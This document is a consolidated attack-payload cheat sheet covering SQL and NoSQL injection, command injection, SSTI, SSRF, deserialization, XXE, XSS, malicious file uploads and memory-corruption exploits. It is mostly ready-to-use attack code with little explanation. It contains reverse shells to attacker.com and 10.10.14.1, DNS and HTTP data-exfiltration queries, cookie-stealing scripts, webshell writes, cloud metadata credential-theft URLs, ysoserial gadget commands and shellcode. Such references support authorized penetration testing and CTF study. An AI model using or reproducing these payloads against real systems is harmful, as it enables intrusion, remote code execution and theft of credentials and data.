# Consolidated Attack Payloads by Category

---

## 1. SQL Injection Payloads

### Basic Detection Probes
```
'
''
`
')
"))
' OR '1'='1
' OR 1=1--
" OR "1"="1
1' AND 1=1--
1' AND 1=2--
1 AND SLEEP(5)--
'; WAITFOR DELAY '0:0:5'--
```

### UNION-Based Extraction

**Step 1 -- Find column count:**
```sql
' ORDER BY 1--
' ORDER BY 2--
' UNION SELECT NULL--
' UNION SELECT NULL,NULL--
' UNION SELECT NULL,NULL,NULL--
```

**Step 2 -- Find string column:**
```sql
' UNION SELECT 'a',NULL,NULL--
' UNION SELECT NULL,'a',NULL--
```

**Step 3 -- Extract data (MySQL):**
```sql
' UNION SELECT table_name,NULL FROM information_schema.tables--
' UNION SELECT column_name,NULL FROM information_schema.columns WHERE table_name='users'--
' UNION SELECT username,password FROM users--
' UNION SELECT NULL,CONCAT(username,':',password) FROM users--
```

**Step 3 -- Extract data (PostgreSQL):**
```sql
' UNION SELECT table_name,NULL FROM information_schema.tables--
' UNION SELECT NULL,string_agg(username||':'||password,',') FROM users--
```

**Step 3 -- Extract data (MSSQL):**
```sql
' UNION SELECT name,NULL FROM master.dbo.sysdatabases--
' UNION SELECT username+':'+password,NULL FROM users--
```

**Step 3 -- Extract data (Oracle):**
```sql
' UNION SELECT table_name,NULL FROM all_tables--
' UNION SELECT username||':'||password,NULL FROM users--
```

### Blind Boolean-Based
```sql
' AND SUBSTRING((SELECT password FROM users WHERE username='admin'),1,1)='a'--
' AND ASCII(SUBSTRING((SELECT password FROM users LIMIT 1),1,1))>64--
' AND (SELECT COUNT(*) FROM users WHERE username='admin')=1--
```

### Blind Time-Based

**MySQL:**
```sql
' AND SLEEP(5)--
' AND IF(1=1,SLEEP(5),0)--
' AND IF(SUBSTRING((SELECT password FROM users LIMIT 1),1,1)='a',SLEEP(5),0)--
```

**PostgreSQL:**
```sql
'; SELECT pg_sleep(5)--
' AND (SELECT CASE WHEN (1=1) THEN pg_sleep(5) ELSE pg_sleep(0) END)--
```

**MSSQL:**
```sql
'; WAITFOR DELAY '0:0:5'--
' IF (1=1) WAITFOR DELAY '0:0:5'--
```

**Oracle:**
```sql
' AND 1=DBMS_PIPE.RECEIVE_MESSAGE('a',5)--
```

### Error-Based Extraction

**MySQL:**
```sql
' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT password FROM users LIMIT 1)))--
' AND (SELECT 1 FROM(SELECT COUNT(*),CONCAT((SELECT password FROM users LIMIT 1),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--
```

**MSSQL:**
```sql
' AND 1=CONVERT(int,(SELECT password FROM users WHERE username='admin'))--
```

**PostgreSQL:**
```sql
' AND CAST((SELECT password FROM users LIMIT 1) AS int)--
```

### Out-of-Band (OOB) -- DNS Exfiltration

**MySQL:**
```sql
' AND LOAD_FILE(CONCAT('\\\\',(SELECT password FROM users LIMIT 1),'.attacker.com\\share\\'))--
```

**MSSQL (xp_dirtree):**
```sql
'; EXEC master..xp_dirtree '//'+( SELECT password FROM users WHERE username='admin')+'/.attacker.com/a'--
```

**Oracle (UTL_HTTP):**
```sql
' UNION SELECT UTL_HTTP.REQUEST('http://attacker.com/'||(SELECT password FROM users WHERE rownum=1)) FROM dual--
```

### RCE via SQL Injection

**MySQL INTO OUTFILE (write webshell):**
```sql
' UNION SELECT "<?php system($_GET['cmd']); ?>" INTO OUTFILE '/var/www/html/shell.php'--
```

**MSSQL xp_cmdshell:**
```sql
'; EXEC sp_configure 'show advanced options',1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell',1; RECONFIGURE--
'; EXEC xp_cmdshell 'whoami'--
```

**PostgreSQL COPY TO/FROM:**
```sql
'; CREATE TABLE cmd_result (output text);--
'; COPY cmd_result FROM PROGRAM 'id';--
'; SELECT * FROM cmd_result;--
```

### WAF Bypass Techniques

**Case variation:**
```sql
' uNiOn SeLeCt null,null--
```

**Comment obfuscation:**
```sql
' UN/**/ION SEL/**/ECT null,null--
' /*!UNION*/ /*!SELECT*/ null,null--
```

**Encoding:**
```sql
' UNION%20SELECT%20null,null--
' UNION%09SELECT%09null,null--
```

**Alternative whitespace:**
```sql
'%0AUNION%0ASELECT%0Anull,null--
```

**Polyglot:**
```
SLEEP(1) /*' or SLEEP(1) or '" or SLEEP(1) or "*/
```

---

## 2. NoSQL Injection Payloads (MongoDB)

### Auth Bypass via Operator Injection

**JSON body (POST /login):**
```json
{"username": {"$ne": null}, "password": {"$ne": null}}
{"username": {"$gt": ""}, "password": {"$gt": ""}}
{"username": "admin", "password": {"$regex": ".*"}}
{"username": {"$in": ["admin", "root", "administrator"]}, "password": {"$ne": "x"}}
```

**URL parameter (GET):**
```
?status[$ne]=inactive
?id[$gt]=0
```

### Data Extraction via Regex Injection
```json
{"username": "admin", "password": {"$regex": "^a"}}
{"username": "admin", "password": {"$regex": "^ab"}}
{"username": "admin", "password": {"$regex": "^abc"}}
```

### $where JavaScript Injection
```json
{"$where": "sleep(5000)"}
{"$where": "this.username == 'admin' || 1==1"}
{"$where": "return true"}
```

### Aggregation Pipeline Injection
```json
[{"$match": {}}, {"$project": {"password": 1}}]
[{"$lookup": {"from": "users", "localField": "_id", "foreignField": "_id", "as": "users"}}]
```

---

## 3. OS Command Injection Payloads

### Basic Detection

**Linux/Unix:**
```
;id
|id
||id
&&id
`id`
$(id)
; id ; echo done
```

**Windows:**
```
&whoami
|whoami
||whoami
&&whoami
```

### Blind CMDi (Out-of-Band)

**DNS-based:**
```bash
;nslookup `id`.attacker.com
;curl http://attacker.com/$(id)
;wget http://attacker.com/?x=$(whoami)
```

**Time-based:**
```bash
; sleep 5
| sleep 5
`sleep 5`
$(sleep 5)
; ping -c 5 127.0.0.1
```

### Reverse Shell Payloads

**Bash:**
```bash
; bash -i >& /dev/tcp/attacker.com/4444 0>&1
```

**Python:**
```bash
; python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("attacker.com",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'
```

**Netcat:**
```bash
; nc -e /bin/sh attacker.com 4444
; nc attacker.com 4444 | /bin/sh | nc attacker.com 4445
```

**PowerShell (Windows):**
```powershell
& powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('attacker.com',4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){$data = (New-Object System.Text.ASCIIEncoding).GetString($bytes,0,$i);$sendback = (iex $data 2>&1 | Out-String);$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback + 'PS ' + (pwd).Path + '> ');$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
```

### Command Separator Cheat Sheet

| Separator | Linux | Windows | Notes |
|---|---|---|---|
| `;` | Yes | No | Runs regardless of exit code |
| `&&` | Yes | Yes | Runs if first succeeds |
| `\|\|` | Yes | Yes | Runs if first fails |
| `\|` | Yes | Yes | Pipes stdout |
| `\n` / `%0a` | Yes | Sometimes | Newline |
| `` ` `` | Yes | No | Command substitution |
| `$()` | Yes | No | Command substitution |
| `&` | Yes | Yes | Background execution |

---

## 4. Path Traversal Payloads

### Basic Sequences
```
../../../etc/passwd
..\..\..\windows\win.ini
```

### URL-Encoded Variations
```
%2e%2e%2f          -> ../
%2e%2e/            -> ../
..%2f              -> ../
%252e%252e%252f    -> ../ (double-encoded)
..%c0%af           -> ../ (overlong UTF-8)
..%c1%9c           -> ..\ (overlong UTF-8)
```

### Null Byte Injection (older PHP/Perl)
```
../../../../etc/passwd%00
../../../../etc/passwd%00.jpg
```

### Filter Bypass
```
....//....//....//etc/passwd
..././..././..././etc/passwd
/var/www/images/../../../etc/passwd
```

### Target Files -- Linux
```
/etc/passwd
/etc/shadow
/proc/self/environ
/proc/self/cmdline
/proc/net/tcp
~/.ssh/id_rsa
/app/.env
/var/log/nginx/access.log
```

### Target Files -- Windows
```
\windows\win.ini
\windows\system32\drivers\etc\hosts
C:\inetpub\wwwroot\web.config
```

---

## 5. SSTI Payloads

### Detection Polyglot
```
{{7*7}}            -> 49 (Jinja2, Twig)
${7*7}             -> 49 (FreeMarker, Java EL)
<%= 7*7 %>         -> 49 (ERB/Ruby)
#{7*7}             -> 49 (Pebble)
*{7*7}             -> 49 (Thymeleaf)
{{7*'7'}}          -> 7777777 (Jinja2) vs 49 (Twig)
```

### Jinja2 (Python) -- RCE
```
{{config}}
{{config.SECRET_KEY}}
{{cycler.__init__.__globals__.os.popen('id').read()}}
{{lipsum.__globals__['os'].popen('id').read()}}
```

**Sandbox escape:**
```python
{% for x in ().__class__.__base__.__subclasses__() %}
  {% if "warning" in x.__name__ %}
    {{x()._module.__builtins__['__import__']('os').popen("id").read()}}
  {% endif %}
{% endfor %}
```

### Twig (PHP) -- RCE
```
{{['id']|filter('system')}}
```

### FreeMarker (Java) -- RCE
```
<#assign ex="freemarker.template.utility.Execute"?new()>${ex("id")}
${"freemarker.template.utility.Execute"?new()("id")}
```

### Velocity (Java) -- RCE
```
#set($rt=$x.class.forName('java.lang.Runtime'))
#set($ex=$rt.getRuntime().exec('id'))
```

### Smarty (PHP) -- RCE
```
{system('id')}
```

### ERB (Ruby) -- RCE
```ruby
<%= `id` %>
<%= system('id') %>
```

---

## 6. LDAP Injection Payloads

### Auth Bypass
```
*)(uid=*))(|(uid=*
admin)(&)
admin)(|(password=*)
```

### Blind LDAP Injection
```
admin)(|(cn=a*
admin)(|(cn=ab*
```

---

## 7. CRLF / Header Injection Payloads

### Basic CRLF
```
value%0d%0aHeader: injected
value%0d%0a%0d%0a<script>alert(1)</script>
```

### Cookie Injection via CRLF
```
username=admin%0d%0aSet-Cookie:%20admin=true
```

### Log Injection
```
username=admin%0aINFO: Admin logged in as admin
```

---

## 8. HTTP Request Smuggling

### CL.TE
```http
POST / HTTP/1.1
Host: vulnerable.com
Content-Length: 13
Transfer-Encoding: chunked

0

SMUGGLED
```

### TE.CL
```http
POST / HTTP/1.1
Host: vulnerable.com
Content-Length: 3
Transfer-Encoding: chunked

8
SMUGGLED
0

```

### Obfuscated TE Header Bypasses
```http
Transfer-Encoding: xchunked
Transfer-Encoding: chunked
Transfer-Encoding: chunked
Transfer-Encoding: x
Transfer-Encoding:[tab]chunked
```

---

## 9. SSRF Payloads

### IP Address Encoding Variations -- 127.0.0.1 Equivalents
```
http://localhost/
http://0.0.0.0/
http://[::1]/
http://[::ffff:127.0.0.1]/
http://2130706433/              (decimal)
http://0177.0.0.1/              (octal)
http://0x7f000001/              (hex)
http://127.000.000.001/         (zero-padded)
http://127.1/                   (abbreviated)
```

### AWS Metadata Endpoint (169.254.169.254) Equivalents
```
http://169.254.169.254/
http://[::ffff:169.254.169.254]/
http://2852039166/              (decimal)
http://0251.0376.0251.0376/     (octal)
http://0xa9.0xfe.0xa9.0xfe/    (hex)
http://169.254.169.254.nip.io/
```

### URL Parser Confusion Attacks

**The @ trick (userinfo bypass):**
```
http://allowed.com@169.254.169.254/latest/meta-data/
```

**The # fragment trick:**
```
http://169.254.169.254#@allowed.com
```

**Subdomain bypass:**
```
http://trusted.com.attacker.com/
```

### Protocol Handlers

**file:// -- Local File Read:**
```
file:///etc/passwd
file:///proc/self/environ
file:///app/.env
file:///home/ubuntu/.ssh/id_rsa
```

**gopher:// -- TCP Connection (Redis attack):**
```
gopher://127.0.0.1:6379/_*1%0d%0a$8%0d%0aflushall%0d%0a...
```

**dict:// -- Port Scanning:**
```
dict://127.0.0.1:22/   -> SSH banner
dict://127.0.0.1:6379/  -> Redis
dict://127.0.0.1:11211/ -> Memcached
```

### Cloud Metadata Endpoints

**AWS EC2 IMDSv1:**
```
http://169.254.169.254/latest/meta-data/
http://169.254.169.254/latest/meta-data/iam/security-credentials/
http://169.254.169.254/latest/meta-data/iam/security-credentials/ROLE_NAME
http://169.254.169.254/latest/user-data
```

**AWS ECS:**
```
http://169.254.170.2${AWS_CONTAINER_CREDENTIALS_RELATIVE_URI}
```

**GCP:**
```
http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token
```
Requires header: `Metadata-Flavor: Google`

**Azure:**
```
http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/
```
Requires header: `Metadata: true`

**Alibaba Cloud:**
```
http://100.100.100.200/latest/meta-data/ram/security-credentials/
```

**DigitalOcean:**
```
http://169.254.169.254/metadata/v1/user-data
```

### DNS Rebinding Setup
1. Register domain with very low TTL (0-1 second)
2. First DNS lookup returns public IP (passes SSRF check)
3. Change DNS to 127.0.0.1
4. Application re-resolves and connects to internal host

### Open Redirect Chaining for SSRF
```
# Application allows fetching from https://trusted.com/*
# trusted.com has an open redirect: /redirect?url=ANYWHERE
# Payload: https://trusted.com/redirect?url=http://169.254.169.254/latest/meta-data/
```

### Blind SSRF Detection
```
http://YOUR_SERVER:8888/ssrf-test
https://YOUR_COLLABORATOR.burpcollaborator.net/
http://YOUR_SUBDOMAIN.interact.sh/
```

---

## 10. Deserialization Payloads

### Python pickle RCE

**Reverse shell:**
```python
import pickle, os, base64

class RCE:
    def __reduce__(self):
        cmd = 'bash -c "bash -i >& /dev/tcp/10.10.14.1/4444 0>&1"'
        return (os.system, (cmd,))

payload = base64.b64encode(pickle.dumps(RCE())).decode()
```

**Subprocess variant (bypasses os.system restrictions):**
```python
import pickle, subprocess, base64

class RCE:
    def __reduce__(self):
        return (subprocess.Popen, (['/bin/bash', '-c',
            'bash -i >& /dev/tcp/10.10.14.1/4444 0>&1'],))

payload = base64.b64encode(pickle.dumps(RCE())).decode()
```

### Python yaml.load RCE

**Direct os.system:**
```yaml
!!python/object/apply:os.system ["id > /tmp/pwned"]
```

**Reverse shell via subprocess:**
```yaml
!!python/object/apply:subprocess.Popen
- - /bin/bash
  - -c
  - bash -i >& /dev/tcp/10.10.14.1/4444 0>&1
```

### Java ysoserial Gadget Chains

```bash
# Generate CommonCollections1 (commons-collections 3.x)
java -jar ysoserial-all.jar CommonsCollections1 'id > /tmp/pwned' | base64 -w0

# Generate CommonCollections6 (commons-collections 4.x)
java -jar ysoserial-all.jar CommonsCollections6 'curl http://10.10.14.1:8080/?pwned=$(id|base64)' | base64 -w0

# Reverse shell (base64-encoded within ysoserial)
java -jar ysoserial-all.jar CommonsCollections1 \
  'bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC4xLzQ0NDQgMD4mMQ==}|{base64,-d}|bash' \
  | base64 -w0
```

**Gadget chain selection guide:**

| Library in classpath | ysoserial chain |
|---|---|
| commons-collections 3.1 | CommonsCollections1, CC2, CC3 |
| commons-collections 4.0 | CommonsCollections4, CC6 |
| commons-beanutils 1.9.2 | CommonsBeanutils1 |
| Spring Framework | Spring1, Spring2 |
| JRE (no extra libs) | URLDNS (DNS only), JRMPClient |

### PHP POP Chain Construction

```php
<?php
class FileWriter {
    public $filename = '/var/www/html/shell.php';
    public $content = '<?php system($_GET["cmd"]); ?>';
}
$payload = new FileWriter();
$serialized = serialize($payload);
$encoded = base64_encode($serialized);
echo $encoded;
```

**PHP serialized object format:**
```
O:<name_len>:"<classname>":<prop_count>:{s:<len>:"<prop_name>";<type>:<val>;}
```

### XXE Payloads

**Classic -- Local File Read:**
```xml
<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<root><data>&xxe;</data></root>
```

**AWS metadata SSRF:**
```xml
<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/iam/security-credentials/">]>
<root><data>&xxe;</data></root>
```

**Blind XXE -- Out-of-Band:**
```xml
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY % remote SYSTEM "http://10.10.14.1:8080/dtd.xml">
  %remote; %payload; %send;
]>
<root/>
```

Attacker-hosted `dtd.xml`:
```xml
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % payload "<!ENTITY &#37; send SYSTEM 'http://10.10.14.1:8080/?data=%file;'>">
```

### .NET ysoserial.net Payloads

```bash
ysoserial.exe -f BinaryFormatter -g TypeConfuseDelegate -c "cmd /c calc.exe" -o base64
ysoserial.exe -f Json.Net -g ObjectDataProvider -c "cmd /c whoami > C:\\inetpub\\wwwroot\\pwned.txt" -o raw
```

**JSON.NET TypeNameHandling payload:**
```json
{
  "$type": "System.Windows.Data.ObjectDataProvider, PresentationFramework",
  "MethodName": "Start",
  "MethodParameters": {
    "$type": "System.Collections.ArrayList, mscorlib",
    "$values": ["cmd", "/c whoami"]
  },
  "ObjectInstance": {
    "$type": "System.Diagnostics.Process, System"
  }
}
```

### Ruby Marshal Payload

```ruby
require 'base64'
class Exploit
  def marshal_load(arr)
    system('id > /tmp/pwned')
  end
end
payload = Base64.encode64(Marshal.dump(Exploit.new))
```

---

## 11. XSS Payloads

### HTML Context (between tags)
```html
<script>alert(document.domain)</script>
<img src=x onerror=alert(1)>
<svg onload=alert(1)>
<iframe src="javascript:alert(1)">
```

### Attribute Context
```html
" onmouseover="alert(1)
" onfocus="alert(1)" autofocus="
' onerror='alert(1)
```

### JavaScript Context
```javascript
';alert(1)//
"-alert(1)-"
${alert(1)}
```

### URL/href Context
```html
javascript:alert(1)
data:text/html,<script>alert(1)</script>
```

### HTML Encoding and Filter Bypass

**Case variation:**
```html
<ScRiPt>alert(1)</ScRiPt>
<img SrC=x OnErRoR=alert(1)>
```

**Tag name obfuscation:**
```html
<details open ontoggle=alert(1)>
<marquee onstart=alert(1)>
<video src=1 onerror=alert(1)>
<input autofocus onfocus=alert(1)>
```

**JavaScript URI bypasses:**
```html
&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;alert(1)
j&#97;vascript:alert(1)
```

**SVG XSS:**
```html
<svg><script>alert(1)</script></svg>
<svg/onload=alert(1)>
<svg><animate onbegin=alert(1) attributeName=x dur=1s>
```

### DOM XSS Payloads

**Via location.hash:**
```
https://target.com/page#<img src=x onerror=alert(document.cookie)>
```

**postMessage DOM XSS:**
```javascript
iframe.contentWindow.postMessage('<svg onload=alert(1)>', '*');
```

### CSP Bypass Payloads

**JSONP endpoint bypass:**
```html
<script src="https://trusted-cdn.com/api/data?callback=alert(1)"></script>
```

**Angular + CDN bypass:**
```html
<script src="https://ajax.googleapis.com/ajax/libs/angularjs/1.1.3/angular.min.js"></script>
<div ng-app ng-csp>{{$eval.constructor('alert(1)')()}}</div>
```

**'unsafe-eval' bypass:**
```javascript
eval(atob('YWxlcnQoMSk='));
```

### Event Handler Injection (no interaction with autofocus)
```html
<input onfocus=alert(1) autofocus>
<select onfocus=alert(1) autofocus>
<textarea onfocus=alert(1) autofocus>
<details ontoggle=alert(1) open>
```

### Session Hijacking Payload
```javascript
<script>new Image().src='https://attacker.com/steal?c='+encodeURIComponent(document.cookie);</script>
```

### Stored XSS Payloads

**Markdown injection:**
```markdown
[Click me](javascript:alert(1))
![x](x" onerror="alert(1))
```

**File upload filename XSS:**
```
"><img src=x onerror=alert(1)>.jpg
```

**HTTP header injection (stored in admin panel):**
```
User-Agent: <script>alert(1)</script>
```

---

## 12. File Handling Payloads

### Zip Slip -- Craft Malicious Zip
```python
#!/usr/bin/env python3
import zipfile

with zipfile.ZipFile('malicious.zip', 'w') as zf:
    zf.writestr('readme.txt', 'Archive contents')
    zf.writestr('../../tmp/zipslip_test.txt', 'zipslip payload')
```

### Malicious Tar with Symlink
```python
#!/usr/bin/env python3
import tarfile, io

with tarfile.open('malicious.tar.gz', 'w:gz') as tf:
    info = tarfile.TarInfo(name='../../symlink')
    info.type = tarfile.SYMTYPE
    info.linkname = '/etc/passwd'
    tf.addfile(info)
```

### SVG XSS Payloads

**Cookie theft:**
```xml
<svg xmlns="http://www.w3.org/2000/svg" onload="fetch('https://ATTACKER.COM/steal?c='+encodeURIComponent(document.cookie))">
  <circle cx="100" cy="100" r="80" fill="blue"/>
</svg>
```

**Session + localStorage exfiltration:**
```xml
<svg xmlns="http://www.w3.org/2000/svg">
<script type="text/javascript">
var img = new Image();
img.src = 'https://ATTACKER.COM/steal?cookie=' + encodeURIComponent(document.cookie)
    + '&ls=' + encodeURIComponent(JSON.stringify(localStorage));
</script>
</svg>
```

### ImageMagick (ImageTragick -- CVE-2016-3714)

**MVG payload -- command execution:**
```
push graphic-context
viewbox 0 0 640 480
fill 'url(https://127.0.0.1/"|id; curl https://ATTACKER.COM/`id`|")'
pop graphic-context
```

**MSL payload -- write arbitrary files:**
```xml
<?xml version="1.0"?>
<image>
<read filename="caption:&lt;?php system($_GET['cmd']); ?&gt;"/>
<write filename="info:/var/www/html/uploads/shell.php"/>
</image>
```

### Path Traversal via Filename (multipart upload)
```http
Content-Disposition: form-data; name="file"; filename="../../etc/cron.d/backdoor"
```

### MIME Type / Extension Bypass
```
shell.php               # direct
shell.php5              # PHP5 alternate
shell.phtml             # PHP alternate
shell.php.jpg           # double extension
shell.php%00.jpg        # null byte truncation (PHP < 5.3.4)
.htaccess               # override config: AddType application/x-httpd-php .jpg
```

### Polyglot: JPEG Header + PHP Code
```python
#!/usr/bin/env python3
jpeg_header = bytes([0xFF, 0xD8, 0xFF, 0xE0, 0x00, 0x10, 0x4A, 0x46, 0x49, 0x46, 0x00, 0x01])
php_payload = b'\n<?php system($_GET["cmd"]); ?>\n'
jpeg_footer = bytes([0xFF, 0xD9])

with open('polyglot.php.jpg', 'wb') as f:
    f.write(jpeg_header + php_payload + jpeg_footer)
```

---

## 13. Memory Corruption Payloads

### Buffer Overflow -- Finding the Offset

**pwntools cyclic pattern:**
```python
from pwn import *
pattern = cyclic(500)
# After crash: offset = cyclic_find(0x61616175)
```

**Metasploit pattern:**
```bash
/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 500
/usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -q 0x39614138
```

### Classic Stack Overflow -- x86 (32-bit)
```python
from pwn import *

shellcode = b"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e"
shellcode += b"\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80"

offset = 76
ret_addr = 0xffffd5a0  # address of shellcode on stack

payload = shellcode + b"A" * (offset - len(shellcode)) + p32(ret_addr)

p = process('./vulnerable')
p.sendline(payload)
p.interactive()
```

### x86-64 Shellcode
```python
shellcode = b"\x48\x31\xd2\x48\xbb\x2f\x2f\x62\x69\x6e\x2f\x73\x68"
shellcode += b"\x48\xc1\xeb\x08\x53\x48\x89\xe7\x52\x57\x48\x89\xe6\x0f\x05"
```

### ROP Chain -- ret2libc (x86-64)
```python
from pwn import *

elf = ELF('./vulnerable')
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')

pop_rdi = 0x401233
ret     = 0x40101a  # stack alignment

payload  = b"A" * 120
payload += p64(ret)
payload += p64(pop_rdi)
payload += p64(bin_sh_addr)
payload += p64(system_addr)
```

### Format String Payloads

**Read stack values:**
```
%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x
%6$x     -> sixth argument
%6$s     -> string at sixth argument address
```

**Write with %n:**
```python
target_addr = 0xdeadbeef
offset = 6
payload = p32(target_addr) + f"%{65 - 4}c%{offset}$n".encode()
```

**pwntools fmtstr_payload:**
```python
writes = {elf.got['exit']: elf.sym['win_function']}
payload = fmtstr_payload(6, writes)
```

### Heap Spray
```python
nop = b"\x90"
chunk = nop * (4096 - len(shellcode)) + shellcode
spray = chunk * 1000
```

### Stack Canary Bypass via Format String Leak
```python
# Leak canary (ends in 0x00 on Linux):
p.sendline(b"%11$p")  # adjust offset
canary = int(p.recvline().strip(), 16)

payload  = b"A" * offset_to_canary
payload += p64(canary)
payload += b"B" * 8  # saved RBP
payload += p64(system_addr)
```
